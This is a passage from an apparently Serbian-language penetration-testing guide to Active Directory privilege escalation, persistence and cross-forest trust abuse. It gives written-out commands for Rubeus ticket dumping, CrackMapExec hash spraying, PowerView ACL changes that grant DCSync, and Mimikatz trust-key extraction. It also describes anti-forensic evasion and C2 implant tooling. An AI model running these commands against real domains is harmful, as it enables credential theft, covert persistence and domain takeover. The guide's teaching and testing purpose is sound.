Kada pribavite neke akreditive, možete proveriti da li imate pristup nekoj **mašini**. U tu svrhu možete da koristite **CrackMapExec** za pokušaj povezivanja sa više servera preko različitih protokola, u skladu sa skeniranjem portova.

### Lokalna eskalacija privilegija

Ako ste kompromitovali akreditive ili sesiju običnog korisnika domena i možete da pristupite **bilo kojoj mašini u domenu**, potražite način da **lokalno eskalirate privilegije i prikupite akreditive**. Lokalne administratorske privilegije mogu vam omogućiti da **izvučete hash-eve drugih korisnika** iz memorije (LSASS) i lokalnog skladišta (SAM).

U ovoj knjizi postoji cela stranica o [**lokalnoj eskalaciji privilegija u Windows-u**](../windows-local-privilege-escalation/index.html) i [**kontrolna lista**](../checklist-windows-privilege-escalation.md). Takođe, ne zaboravite da koristite [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tiketi trenutne sesije

**Malo je verovatno** da ćete pronaći **tikete** u trenutnom korisniku koji vam **daju dozvolu za pristup** neočekivanim resursima, ali možete proveriti:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Sa domenskim kredencijalima ili korisničkom sesijom, ponovo razmotrite NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): tehnike enumeracije nakon autentifikacije i prisiljavanja na autentifikaciju mogu otkriti relay putanje koje nisu bile dostupne tokom izviđanja bez autentifikacije.

### Traženje Creds u računarskim deljenim resursima | SMB Shares

Sada kada imate neke osnovne kredencijale, trebalo bi da proverite možete li **pronaći** neke **zanimljive fajlove koji se dele unutar AD-a**. To možete uraditi ručno, ali to je veoma dosadan i repetitivan zadatak (posebno ako pronađete stotine dokumenata koje treba da proverite).

[**Pratite ovaj link da biste saznali koje alate možete koristiti.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Krađa NTLM Creds

Ako možete **pristupiti drugim računarima ili deljenim resursima**, možete **postaviti fajlove** (kao što je SCF fajl) koji će, ako im neko nekako pristupi, **izazvati NTLM autentifikaciju prema vama**, kako biste mogli **ukrasti** **NTLM challenge** i pokušati da ga razbijete:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ova ranjivost je svakom autentifikovanom korisniku omogućavala da **kompromituje kontroler domena**.


{{#ref}}
printnightmare.md
{{#endref}}

## Eskalacija privilegija u Active Directory-ju SA privilegovanim kredencijalima/sesijom

**Za sledeće tehnike nije dovoljan običan korisnik domena; potrebne su vam posebne privilegije/kredencijali za izvođenje ovih napada.**

### Izdvajanje hash-eva

Nadamo se da ste uspeli da **kompromitujete neki nalog lokalnog administratora** koristeći [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), uključujući relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [lokalnu eskalaciju privilegija](../windows-local-privilege-escalation/index.html).\
Zatim je vreme da izvučete sve hash-eve iz memorije i sa lokalnog sistema.\
[**Pročitajte ovu stranicu o različitim načinima pribavljanja hash-eva.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Kada dobijete korisnikov hash**, možete ga iskoristiti za **imitiranje** tog korisnika.\
Potrebno je da upotrebite neki **alat** koji će **obaviti** **NTLM autentifikaciju koristeći** taj **hash**, **ili** možete kreirati novu **sessionlogon** sesiju i **ubaciti** taj **hash** u **LSASS**, tako da se taj **hash koristi pri svakom obavljanju NTLM autentifikacije.** Poslednja opcija je ono što radi mimikatz.\
[**Pročitajte ovu stranicu za više informacija.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ovaj napad ima za cilj da **upotrebi korisnikov NTLM hash za zahtevanje Kerberos tiketa**, kao alternativu uobičajenom Pass The Hash napadu preko NTLM protokola. Zato može biti posebno **koristan u mrežama u kojima je NTLM protokol onemogućen**, a kao protokol za autentifikaciju je dozvoljen samo **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

U metodi napada **Pass The Ticket (PTT)**, napadači **kradu korisnikov tiket za autentifikaciju** umesto njegove lozinke ili hash vrednosti. Zatim koriste taj ukradeni tiket da **imitiraju korisnika** i dobiju neovlašćen pristup resursima i servisima unutar mreže.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Ponovna upotreba kredencijala

Ako imate **hash** ili **lozinku** **lokalnog administrato**ra, trebalo bi da pokušate da se pomoću njih **lokalno prijavite** na druge **računare**.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Imajte na umu da je ovo prilično **bučno** i da bi **LAPS** to **ublažio**.

### Zloupotreba MSSQL-a i pouzdane veze

Ako korisnik ima privilegije za **pristup MSSQL instancama**, možda će moći da ih iskoristi za **izvršavanje komandi** na MSSQL hostu (ako se pokreću kao SA), **krađu** NetNTLM **hasha** ili čak izvođenje **relay** **attacka**.\
Ako je MSSQL instanca pouzdana preko veze sa bazom podataka na drugoj instanci, korisnik sa privilegijama nad povezanom bazom možda će moći da **iskoristi odnos poverenja za izvršavanje upita na drugoj instanci**. Ovi odnosi poverenja mogu da se ulančaju i na kraju dovedu do pogrešno konfigurisane baze podataka na kojoj korisnik može da izvršava komande.\
**Veze između baza podataka funkcionišu čak i preko forest trustova.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Zloupotreba IT platformi za inventar i deployment

Paketi trećih strana za inventar i deployment često omogućavaju moćne načine za pristup kredencijalima i izvršavanje koda. Pogledajte:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ako pronađete bilo koji Computer objekat sa atributom [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i imate domenske privilegije na računaru, moći ćete da iz memorije izvučete TGT-ove svih korisnika koji se prijave na taj računar.\
Dakle, ako se **Domain Admin prijavi na računar**, moći ćete da izvučete njegov TGT i da se predstavljate kao on koristeći [Pass the Ticket](pass-the-ticket.md).\
Zahvaljujući constrained delegation-u, mogli biste čak i **automatski da kompromitujete Print Server** (nadamo se da će to biti DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ako je korisniku ili računaru dozvoljen „Constrained Delegation“, moći će da se **predstavlja kao bilo koji korisnik radi pristupa određenim servisima na računaru**.\
Zatim, ako **kompromitujete hash** tog korisnika/računara, moći ćete da se **predstavljate kao bilo koji korisnik** (čak i kao domain admin) radi pristupa određenim servisima.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resource-based Constrained Delegation

Privilegija **WRITE** nad Active Directory objektom udaljenog računara omogućava izvršavanje koda sa **povišenim privilegijama**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Zloupotreba dozvola/ACL-ova

Kompromitovani korisnik može imati neke **zanimljive privilegije nad određenim domenskim objektima** koje bi vam mogle omogućiti kasnije lateralno kretanje/**eskalaciju** privilegija.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Zloupotreba Printer Spooler servisa

Otkrivanje **Spool servisa koji osluškuje** unutar domena može se **zloupotrebiti** za **prikupljanje novih kredencijala** i **eskalaciju privilegija**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Zloupotreba sesija korisnika trećih strana

Ako **drugi korisnici** **pristupaju** **kompromitovanoj** mašini, moguće je **prikupiti kredencijale iz memorije**, pa čak i **ubaciti beacone u njihove procese** kako biste se predstavljali kao oni.\
Korisnici obično pristupaju sistemu preko RDP-a, pa su ovde navedeni načini za izvođenje nekoliko napada na RDP sesije korisnika trećih strana:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** omogućava upravljanje **lozinkom lokalnog Administratora** na računarima pridruženim domenu, čime se obezbeđuje da ona bude **nasumična**, jedinstvena i često **menjana**. Te lozinke se čuvaju u Active Directory-ju, a pristup njima kontrolišu ACL-ovi, tako da im mogu pristupiti samo ovlašćeni korisnici. Uz dovoljne dozvole za pristup tim lozinkama, moguće je preći na druge računare.


{{#ref}}
laps.md
{{#endref}}

### Krađa sertifikata

**Prikupljanje sertifikata** sa kompromitovane mašine može biti način za eskalaciju privilegija u okruženju:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Zloupotreba predložaka sertifikata

Ako su konfigurisani **ranjivi predlošci**, moguće ih je zloupotrebiti za eskalaciju privilegija:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation sa nalogom visokih privilegija

### Izvlačenje domenskih kredencijala

Kada dobijete privilegije **Domain Admin** ili, još bolje, **Enterprise Admin**, možete da **izvučete** **domensku bazu podataka**: _ntds.dit_.

[**Više informacija o DCSync attacku možete pronaći ovde**](dcsync.md).

[**Više informacija o krađi datoteke NTDS.dit možete pronaći ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Čitljivu rezervnu arhivu koja sadrži `ntds.dit` zajedno sa `SYSTEM` hive-om treba smatrati izloženim domenskim materijalom čak i pre izdvajanja. Zastareo password hash ne znači da su drugi atributi objekta bezbedni: polja kao što je `description` mogu sadržati kredencijale ili operativne beleške. Najpre pregledajte nazive članova arhive i nemojте uključivati izdvojeni sadržaj baze podataka u uobičajeni izlaz enumeracije.

### Privesc kao Persistence

Neke od prethodno razmatranih tehnika mogu se koristiti za persistence.\
Na primer, mogli biste da:

- Učinite korisnike ranjivim na [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Učinite korisnike ranjivim na [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Dodelite korisniku privilegije [**DCSync**](#dcsync)

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack** kreira legitiman **Ticket Granting Service (TGS) ticket** za određeni servis pomoću **NTLM hash-a** (na primer, **hash-a PC naloga**). Ova metoda se koristi za **pristup privilegijama servisa**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** podrazumeva da napadač dobije pristup **NTLM hash-u naloga krbtgt** u okruženju Active Directory (AD). Ovaj nalog je poseban zato što se koristi za potpisivanje svih **Ticket Granting Tickets (TGTs)**, koji su neophodni za autentifikaciju unutar AD mreže.

Kada dobije ovaj hash, napadač može da kreira **TGTs** za bilo koji nalog po svom izboru (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ovi ticket-i su poput golden ticket-a, ali falsifikovani tako da **zaobilaze uobičajene mehanizme za otkrivanje golden ticket-a.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence pomoću sertifikata naloga**

**Posedovanje sertifikata naloga ili mogućnost njihovog zahtevanja** veoma je dobar način da se održi persistence u korisničkom nalogu (čak i ako korisnik promeni lozinku):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence pomoću sertifikata domena**

**Sertifikati se mogu koristiti i za održavanje persistence-a sa visokim privilegijama unutar domena:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Grupa AdminSDHolder

Objekat **AdminSDHolder** u Active Directory-ju štiti **privilegovane grupe** (kao što su Domain Admins i Enterprise Admins) primenom standardne **Access Control List (ACL)** na te grupe kako bi sprečio neovlašćene izmene. Međutim, ova funkcija može da se iskoristi: ako napadač izmeni ACL za AdminSDHolder tako da običnom korisniku dodeli puni pristup, taj korisnik dobija široku kontrolu nad svim privilegovanim grupama. Ova bezbednosna mera, čija je namena zaštita, može tako da ima suprotan efekat i omogući neovlašćen pristup ako se pažljivo ne nadgleda.

[**Više informacija o grupi AdminDSHolder potražite ovde.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Na svakom **Domain Controller-u (DC)** postoji nalog **lokalnog administratora**. Ako dobijete administratorska prava na takvoj mašini, lokalni Administrator hash može da se izdvoji pomoću **mimikatz**. Zatim je neophodno izmeniti registar da bi se **omogućilo korišćenje ove lozinke**, čime se omogućava udaljeni pristup nalogu lokalnog Administrator-a.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Možete da **dodelite** korisniku **posebne dozvole** nad određenim objektima domena, koje će mu omogućiti da **eskalira privilegije u budućnosti**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptor-i** se koriste za **čuvanje** **dozvola** koje **objekat** ima **nad** drugim **objektom**. Ako možete da napravite samo **malu izmenu** u **security descriptor-u** objekta, možete da dobijete veoma zanimljive privilegije nad tim objektom, bez potrebe da budete član privilegovane grupe.


{{#ref}}
security-descriptors.md
{{#endref}}

### Anti-Forensics / Evasion pomoću Dynamic Objects

Zloupotrebite pomoćnu klasu `dynamicObject` da biste kreirali kratkotrajne principals/GPOs/DNS zapise pomoću `entryTTL`/`msDS-Entry-Time-To-Die`; oni se sami brišu bez tombstone-a, uklanjajući LDAP dokaze, ali ostavljajući orphan SID-ove, neispravne reference `gPLink` ili keširane DNS odgovore (npr. zagađivanje ACE-a za AdminSDHolder ili zlonamerne preusmeravanja `gPCFileSysPath`/AD-integrated DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Izmenite **LSASS** u memoriji da biste postavili **univerzalnu lozinku**, čime se omogućava pristup svim nalozima domena.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Ovde saznajte šta je SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Možete da napravite **sopstveni SSP** za **hvatanje** **akreditiva** u **čistom tekstu** koji se koriste za pristup mašini.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registruje **novi Domain Controller** u AD-u i koristi ga za **slanje atributa** (SIDHistory, SPNs...) na određene objekte, **bez** ostavljanja bilo kakvih **logova** o **izmenama**. Potrebne su vam privilegije **DA** i morate biti unutar **root domain-a**.\
Imajte na umu da će se pojaviti prilično ružni logovi ako upotrebite pogrešne podatke.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Ranije smo govorili o tome kako da eskalirate privilegije ako imate **dovoljno dozvola za čitanje LAPS lozinki**. Međutim, ove lozinke mogu da se koriste i za **održavanje persistence-a**.\
Pogledajte:


{{#ref}}
laps.md
{{#endref}}

## Eskalacija privilegija u šumi - Domain Trusts

Microsoft smatra da je **šuma** bezbednosna granica. To znači da **kompromitovanje jednog domena potencijalno može dovesti do kompromitovanja cele šume**.<sup>[[1]](#references)</sup>

### Osnovne informacije

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) je bezbednosni mehanizam koji korisniku iz jednog **domena** omogućava pristup resursima u drugom **domenu**. On u suštini povezuje sisteme za autentifikaciju ta dva domena, omogućavajući nesmetan protok provera autentifikacije. Kada domeni uspostave trust, razmenjuju i čuvaju određene **ključeve** na svojim **Domain Controller-ima (DCs)**, koji su ključni za integritet trust-a.

U uobičajenom scenariju, ako korisnik želi da pristupi servisu u **trusted domain-u**, prvo mora da zatraži poseban ticket, poznat kao **inter-realm TGT**, od DC-a svog domena. Ovaj TGT je šifrovan zajedničkim **ključem** o kom su se oba domena dogovorila. Zatim korisnik prosleđuje ovaj TGT **DC-u trusted domain-a** da bi dobio service ticket (**TGS**). Kada DC trusted domain-a uspešno proveri inter-realm TGT, izdaje TGS koji korisniku omogućava pristup servisu.

**Koraci**:

1. **Klijentski računar** u **domenu 1** započinje proces korišćenjem svog **NTLM hash-a** za zahtev **Ticket Granting Ticket-a (TGT)** od svog **Domain Controller-a (DC1)**.
2. DC1 izdaje novi TGT ako je klijent uspešno autentifikovan.
3. Klijent zatim od DC1 traži **inter-realm TGT**, koji mu je potreban za pristup resursima u **domenu 2**.
4. Inter-realm TGT je šifrovan pomoću **trust key-a** koji DC1 i DC2 dele u okviru dvosmernog domain trust-a.
5. Klijent prenosi inter-realm TGT do **Domain Controller-a domena 2 (DC2)**.
6. DC2 proverava inter-realm TGT pomoću zajedničkog trust key-а и, ако је важећи, издаје **Ticket Granting Service (TGS)** за сервер у домену 2 ком клијент жели да приступи.
7. Na kraju, klijent prosleđuje ovaj TGS serveru, koji je šifrovan hash-om naloga servera, kako bi dobio pristup servisu u domenu 2.

### Različiti trust-ovi

Važno je napomenuti da **trust može biti jednosmeran ili dvosmeran**. U dvosmernom trust-u, oba domena veruju jedan drugom, dok je u **jednosmernom** trust odnosu jedan domen **trusted**, a drugi **trusting** domen. U ovom drugom slučaju, **moći ćete da pristupite resursima u trusting domenu samo iz trusted domena**.

Ako Domain A veruje Domain B-u, A je trusting domen, a B trusted domen. Pored toga, u **domenu A** to bi bio **Outbound trust**, a u **domenu B** **Inbound trust**.

**Različiti odnosi trust-a**

- **Parent-Child Trusts**: Ovo je uobičajeno podešavanje unutar iste šume, gde child domen automatski ima dvosmerni transitive trust sa parent domenom. To u suštini znači da zahtevi za autentifikaciju mogu nesmetano da prolaze između parent i child domena.
- **Cross-link Trusts**: Poznati i kao „shortcut trusts“, uspostavljaju se između child domena kako bi se ubrzao proces prosleđivanja zahteva. U složenim šumama, zahtevi za prosleđivanje autentifikacije obično moraju da putuju do root domena šume, a zatim do ciljnog domena. Uspostavljanjem cross-link-ova put se skraćuje, što je naročito korisno u geografski rasprostranjenim okruženjima.
- **External Trusts**: Uspostavljaju se između različitih, nepovezanih domena i po svojoj prirodi nisu tranzitivni. Prema [Microsoft-ovoj dokumentaciji](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trust-ovi su korisni za pristup resursima u domenu izvan trenutne šume koji nije povezan forest trust-om. SID filtering povećava bezbednost kod external trust-ova.
- **Tree-root Trusts**: Ovi trust-ovi se automatski uspostavljaju između root domena šume i novog dodatog tree root-a. Iako se ne sreću često, tree-root trust-ovi su važni za dodavanje novih stabala domena u šumu, omogućavajući im da zadrže jedinstveno ime domena i obezbeđujući dvosmernu tranzitivnost. Više informacija potražite u [Microsoft-ovom vodiču](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ovaj tip trust-a je dvosmerni, tranzitivni trust između dva root domena šume; primenjuje se i SID filtering radi povećanja bezbednosti.
- **MIT Trusts**: Ovi trust-ovi se uspostavljaju sa Kerberos domenima koji nisu Windows i usklađeni su sa [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trust-ovi su specijalizovaniji i namenjeni okruženjima koja zahtevaju integraciju sa sistemima zasnovanim na Kerberos-u izvan Windows ekosistema.

#### Druge razlike u **odnosima trust-a**

- Odnos trust-a može biti i **tranzitivan** (A veruje B-u, B veruje C-u, pa A veruje C-u) ili **netranzitivan**.
- Odnos trust-a može biti podešen kao **dvosmerni trust** (obe strane veruju jedna drugoj) ili kao **jednosmerni trust** (samo jedna strana veruje drugoj).

### Putanja napada

1. **Nabrojte** odnose trust-a.
2. Proverite da li neki **security principal** (korisnik/grupa/računar) ima **pristup** resursima **drugog domena**, možda preko ACE unosa ili članstva u grupama drugog domena. Potražite **odnose između domena** (verovatno je zato trust i uspostavljen).
   1. U ovom slučaju, kerberoast bi mogao biti još jedna mogućnost.
3. **Kompromitujte** **naloge** koji mogu da se koriste za **pivot** između domena.

Napadači mogu da pristupe resursima u drugom domenu pomoću tri osnovna mehanizma:

- **Članstvo u lokalnoj grupi**: Principals mogu biti dodati u lokalne grupe na mašinama, kao što je grupa „Administrators“ na serveru, čime dobijaju značajnu kontrolu nad tom mašinom.
- **Članstvo u grupi stranog domena**: Principals mogu biti i članovi grupa u stranom domenu. Međutim, uspešnost ove metode zavisi od prirode trust-a i opsega grupe.
- **Access Control Lists (ACLs)**: Principals mogu biti navedeni u **ACL-u**, posebno kao entiteti u **ACE-ovima** unutar **DACL-a**, čime im se omogućava pristup određenim resursima. Za one koji žele detaljnije da razumeju mehanizme ACL-ova, DACL-ova i ACE-ova, whitepaper pod naslovom „[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)“ je neprocenjiv izvor informacija.<sup>[[17]](#references)</sup>

### Pronalaženje spoljnih korisnika/grupa sa dozvolama

Možete da proverite **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** da biste pronašli strane security principals u domenu. To će biti korisnici/grupe iz **spoljnog domena/šume**.

Ovo možete da proverite u **Bloodhound**-u ili pomoću powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Eskalacija privilegija iz podređenog u nadređeni domen šume

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Drugi načini za enumerisanje poverenja domena:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Postoje **2 ključa poverenja**: jedan za _Child --> Parent_, a drugi za _Parent_ --> _Child_.\
> Ključ koji koristi trenutni domen možete pronaći pomoću:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskalirajte do Enterprise admin u child/parent domenu zloupotrebom trust-a putem SID-History injection-a:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Razumevanje načina na koji se Configuration Naming Context (NC) može iskoristiti ključno je. Configuration NC služi kao centralno skladište konfiguracionih podataka u AD okruženjima, za celu šumu. Ti podaci se repliciraju na svaki Domain Controller (DC) u šumi, a writable DC-ovi održavaju writable kopiju Configuration NC-a. Da bi se ovo iskoristilo, neophodne su **SYSTEM privilegije na DC-u**, po mogućstvu child DC-u.

**Povežite GPO sa root DC site-om**

Sites kontejner u Configuration NC-u sadrži informacije o site-ovima svih računara pridruženih domenu u AD šumi. Napadači sa SYSTEM privilegijama na bilo kom DC-u mogu da povežu GPO-ove sa root DC site-ovima. Ovim se potencijalno kompromituje root domen manipulisanjem pravilima koja se primenjuju na te site-ove.

Za detaljnije informacije možete pogledati istraživanje o [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Kompromitujte bilo koji gMSA u šumi**

Jedan vektor napada podrazumeva ciljanje privilegovanih gMSA-ova u domenu. KDS Root key, neophodan za izračunavanje lozinki za gMSA naloge, čuva se u Configuration NC-u. Sa SYSTEM privilegijama na bilo kom DC-u moguće je pristupiti KDS Root key-u i izračunati lozinke za bilo koji gMSA u šumi.

Detaljnu analizu i uputstva korak po korak možete pronaći ovde:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Dopunski napad na delegirani MSA (BadSuccessor – zloupotreba atributa migracije):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatno istraživanje: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Napad izmenom Schema-e**

Ovaj metod zahteva strpljenje, jer treba sačekati da se kreiraju novi privilegovani AD objekti. Uz SYSTEM privilegije, napadač može da izmeni AD Schema-u kako bi bilo kom korisniku dodelio potpunu kontrolu nad svim klasama. To može dovesti do neovlašćenog pristupa novokreiranim AD objektima i kontrole nad njima.

Više informacija dostupno je u tekstu [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Od DA do EA pomoću ADCS ESC5**

Ranjivost ADCS ESC5 cilja kontrolu nad Public Key Infrastructure (PKI) objektima radi kreiranja certificate template-a koji omogućava autentifikaciju kao bilo koji korisnik u šumi. Pošto se PKI objekti nalaze u Configuration NC-u, kompromitovanje writable child DC-a omogućava izvođenje ESC5 napada.

Više detalja potražite u tekstu [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> U okruženjima bez ADCS-a, napadač može da podesi neophodne komponente, kao što je opisano u tekstu [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Spoljni forest domen - jednosmerni (inbound) ili dvosmerni

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

U ovom scenariju **vašem domenu veruje** eksterni domen, čime vam daje **neutvrđene dozvole** nad njim. Treba da utvrdite **koji principali iz vašeg domena imaju koji nivo pristupa eksternom domenu**, a zatim da pokušate da to iskoristite:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterni domen šume — jednosmerni (izlazni)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

U ovom scenariju **vaš domen** je **domen koji uspostavlja poverenje** i **dodeljuje privilegije** principalu iz **drugog domena**.

Međutim, kada **domen koji prima poverenje** uspostavi poverenje sa domenom koji ga daje, domen koji prima poverenje **kreira korisnika** sa **predvidljivim imenom**, a kao **lozinku koristi lozinku poverenja**. To znači da je moguće **pristupiti korisniku iz domena koji daje poverenje i tako ući u domen koji prima poverenje**, nabrojati njegove resurse i pokušati da se eskaliraju dodatne privilegije:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Drugi način da se kompromituje domen koji prima poverenje jeste da se pronađe [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) kreiran u **suprotnom smeru** od poverenja između domena (što nije naročito često).

Još jedan način da se kompromituje domen koji prima poverenje jeste da se sačeka na mašini na koju **korisnik iz domena koji prima poverenje može da pristupi** i prijavi se putem **RDP-a**. Zatim bi napadač mogao da ubaci kod u proces RDP sesije i odatle **pristupi izvornom domenu žrtve**.\
Pored toga, ako je **žrtva montirala svoj hard disk**, napadač bi iz procesa **RDP sesije** mogao da smesti **backdoors** u **fasciklu Startup na hard disku**. Ova tehnika se zove **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Ublažavanje zloupotrebe poverenja između domena

### **SID Filtering:**

- Rizik od napada koji koriste atribut SID history preko poverenja između šuma ublažava se funkcijom SID Filtering, koja je podrazumevano aktivirana za sva poverenja između šuma. To se zasniva na pretpostavci da su poverenja unutar šuma bezbedna, jer Microsoft smatra šumu, a ne domen, bezbednosnom granicom.
- Međutim, postoji jedna začkoljica: SID filtering može da ometa aplikacije i pristup korisnika, pa se ponekad deaktivira.

### **Selective Authentication:**

- Za poverenja između šuma, korišćenjem funkcije Selective Authentication obezbeđuje se da se korisnici iz dva šuma ne autentifikuju automatski. Umesto toga, korisnicima su potrebne eksplicitne dozvole za pristup domenima i serverima unutar domena ili šuma koji uspostavlja poverenje.
- Važno je napomenuti da ove mere ne štite od iskorišćavanja upisivog Configuration Naming Context (NC) niti od napada na nalog poverenja.

[**Više informacija o poverenjima između domena na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Zloupotreba AD-a zasnovana na LDAP-u iz implantata na hostu

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) ponovo implementira LDAP primitive u stilu bloodyAD kao x64 Beacon Object Files koji se izvršavaju u potpunosti unutar implantata na hostu (npr. Adaptix C2). Operateri kompajliraju paket komandom `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, učitavaju `ldap.axs`, a zatim pozivaju `ldap <subcommand>` iz beacon-a. Sav saobraćaj koristi trenutni bezbednosni kontekst prijave preko LDAP-a (389) sa potpisivanjem/šifrovanjem ili LDAPS-a (636) uz automatsko poverenje u sertifikat, tako da nisu potrebni socks proxy-ji ni artefakti na disku.<sup>[[4]](#references)</sup>

